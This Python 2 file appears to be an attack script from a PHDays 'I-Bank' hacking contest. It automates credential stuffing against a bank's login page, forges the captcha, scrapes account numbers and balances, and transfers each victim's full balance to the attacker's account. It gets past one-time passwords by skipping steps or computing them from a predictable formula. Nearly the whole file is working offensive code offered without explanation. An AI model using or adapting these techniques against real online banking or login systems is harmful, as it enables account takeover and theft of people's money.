import base64
import collections
import cookielib
from exceptions import KeyError, ValueError
import random
import threading
import urllib, urllib2
from config import TARGET_HOST, LOGGER, RE_ACCOUNT_NUMBER, RE_AMOUNT, RE_ID, MY_ACCOUNT, RE_TICKET
from my_queues import GOOD, kLock, known_users

KEY, PREV, NEXT = range(3)

__author__ = 'gifts'

class  OrderedSet(collections.MutableSet):
    def __init__(self, iterable=None):
        self.end = end = []
        end += [None, end, end]         # sentinel node for doubly linked list
        self.map = {}                   # key --> [key, prev, next]
        if iterable is not None:
            self |= iterable

    def __len__(self):
        return len(self.map)

    def __contains__(self, key):
        return key in self.map

    def add(self, key):
        if key not in self.map:
            end = self.end
            curr = end[PREV]
            curr[NEXT] = end[PREV] = self.map[key] = [key, curr, end]

    def discard(self, key):
        if key in self.map:
            key, prev, next = self.map.pop(key)
            prev[NEXT] = next
            next[PREV] = prev

    def __iter__(self):
        end = self.end
        curr = end[NEXT]
        while curr is not end:
            yield curr[KEY]
            curr = curr[NEXT]

    def __reversed__(self):
        end = self.end
        curr = end[PREV]
        while curr is not end:
            yield curr[KEY]
            curr = curr[PREV]

    def pop(self, last=True):
        if not self:
            raise KeyError('set is empty')
        key = next(reversed(self)) if last else next(iter(self))
        self.discard(key)
        return key

    def __repr__(self):
        if not self:
            return '%s()' % (self.__class__.__name__,)
        return '%s(%r)' % (self.__class__.__name__, list(self))

    def __eq__(self, other):
        if isinstance(other, OrderedSet):
            return len(self) == len(other) and list(self) == list(other)
        return set(self) == set(other)

    def __del__(self):
        self.clear()                    # remove circular references


def generate_cookie(name, value):
    return cookielib.Cookie(
        version=0,
        name=urllib.quote(str(name)),
        value=urllib.quote(str(value)),
        port=None,
        port_specified=False,
        domain=TARGET_HOST,
        domain_specified=False,
        domain_initial_dot=True,
        path='/',
        path_specified=True,
        secure=False,
        expires=None,
        discard=True,
        comment=None,
        comment_url=None,
        rest={'HttpOnly': None},
        rfc2109=False
    )


def add_good(user, password, data, opener):
    LOGGER.info('!!Found good: %r %r', user, password)
    with kLock:
        known_users.add(user)
    try:
        acc_data = account_data(user, password, data, opener)
        GOOD.put(acc_data)
    except ValueError:
        LOGGER.error('Error adding %r %r', user, password)
        LOGGER.debug('%s', data)


class account_data():
    def __init__(self, user, password, data, opener):
        LOGGER.info('Created new account data for %s', user)
        self.user = user
        self.password = password
        self.number = RE_ACCOUNT_NUMBER.search(data)
        self.amount = RE_AMOUNT.search(data)
        self.id = RE_ID.search(data)

        if self.number is None or self.amount is None:
            raise ValueError('No account number or amount in file')
        self.number = self.number.group(1)
        self.amount = self.amount.group(1)
        self.amount = int(float(self.amount))
        self.id = self.id.group(1)
        self.opener = opener

    def gen_otp(self, ticket, rnd_val):
        return str(
            (int(self.id) + 44553)
            * int(rnd_val)
            * (int(ticket) + 9)
        )[:5]

    def gen_auth_cookie(self):
        for handler in self.opener.handlers:
            if not isinstance(handler, urllib2.HTTPCookieProcessor):
                continue
            for cookie in handler.cookiejar:
                if cookie.name != 'auth':
                    continue
                return '{0}={1}'.format(urllib.quote(cookie.name), cookie.value)
        pass


def my_url_open(opener, request):
    try:
        result = opener.open(request)
    except urllib2.HTTPError as e:
        result = e
    data = result.read()
    return data


class BaseForAll(threading.Thread):
    def generate_captcha(self, value):
        return base64.b64encode(base64.b64encode(str(value))[::-1])

    def generate_opener(self):
        self.cookiejar = cookielib.CookieJar()
        self.opener = urllib2.build_opener(
            urllib2.HTTPCookieProcessor(self.cookiejar),
        )
        return self.opener

    def do_login(self, user, password, opener=None):
        if opener is None:
            opener = self.opener
        rand_captcha = str(random.randint(10000, 99999))
        req = urllib2.Request(
            'http://{0}/login.php'.format(TARGET_HOST),
            urllib.urlencode(
                    {
                    'login': user.strip(),
                    'password': password.strip(),
                    'code': rand_captcha,
                    '_code': self.generate_captcha(rand_captcha)
                }
            )
            # TODO: possible headers error
        )
        data = my_url_open(opener, req)
        #LOGGER.debug('DEBUG RECOVER: %s', data)
        return data

    def _pre_otp(self, obj):
        if int(obj.amount) <= 0:
            LOGGER.info('No money on account: %s', obj.user)
            return False
        req = urllib2.Request('http://{0}/transaction.php'.format(TARGET_HOST),
            urllib.urlencode({
                'accountNumberFrom': obj.number,
                'accountNumberTo': MY_ACCOUNT,
                'accountSum': obj.amount,
                'step': 'step2'
            })
        )
        data = my_url_open(obj.opener, req)
        # TODO: bad auth??
        if 'PHDays I-Bank Pro: transaction' not in data:
            obj.opener = self.generate_opener()
            self.do_login(obj.user, obj.password, obj.opener)
            data = my_url_open(obj.opener, req)
        return data

    def do_otp(self, obj):
        data = self._pre_otp(obj)
        if data is False:
            return False

        step3 = urllib2.Request('http://{0}/transaction.php'.format(TARGET_HOST),
            urllib.urlencode({
                'step': 'step3'
            })
        )
        step4 = urllib2.Request('http://{0}/transaction.php'.format(TARGET_HOST),
            urllib.urlencode({
                'step': 'step4'
            })
        )
        # Case:
        # 1) No otp
        if 'Commit transaction.' in data:
            LOGGER.info('No otp')
            data = my_url_open(obj.opener, step3)
        # 2) SmartCard otp
        elif 'One-time password:' in data:
            LOGGER.info('Smart card otp')

            data = my_url_open(obj.opener, step4)
        # 3) Brute otp
        elif 'One-time password (#' in data:
            tmp_ticket = RE_TICKET.search(data)
            if not tmp_ticket:
                return False
            tmp_ticket = tmp_ticket.group(1)
            step_OTP1 = urllib2.Request('http://{0}/transaction.php'.format(TARGET_HOST),
                urllib.urlencode({
                    'step': 'step3',
                    'OTP': obj.gen_otp(tmp_ticket, 2)
                })
            )
            step_OTP2 = urllib2.Request('http://{0}/transaction.php'.format(TARGET_HOST),
                urllib.urlencode({
                    'step': 'step3',
                    'OTP': obj.gen_otp(tmp_ticket, 3)
                })
            )
            data = my_url_open(obj.opener, step_OTP1)
            data += my_url_open(obj.opener, step_OTP2)
            data = my_url_open(obj.opener, step4)
        else:
            LOGGER.error('Bad transaction page: ')
            LOGGER.debug('%r', data)
        result = 'Transaction committed!' in data
        if result:
            LOGGER.info('Transaction from: %s', obj.number)
        return result

    def open(self, request):
        try:
            result = self.opener.open(request)
        except urllib2.HTTPError as e:
            result = e
        data = result.read()
        return data